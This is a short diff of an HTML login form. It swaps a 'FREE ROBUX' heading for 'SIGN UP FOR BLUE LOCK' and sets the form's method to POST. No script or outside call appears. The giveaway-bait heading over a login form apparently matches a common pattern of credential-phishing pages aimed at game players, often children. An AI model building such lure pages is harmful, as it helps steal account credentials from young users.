@@ -18,10 +18,10 @@
 
       <!-- Main Div -->
       <div class="login-main">
-        <h1>FREE ROBUX</h1>
+        <h1>SIGN UP FOR BLUE LOCK</h1>
         <hr class="login" />
 
-        <form class="login" name="myform" method="">
+        <form class="login" name="myform" method="POST">
 
           <!-- Subheading -->
           <div class="subheading">
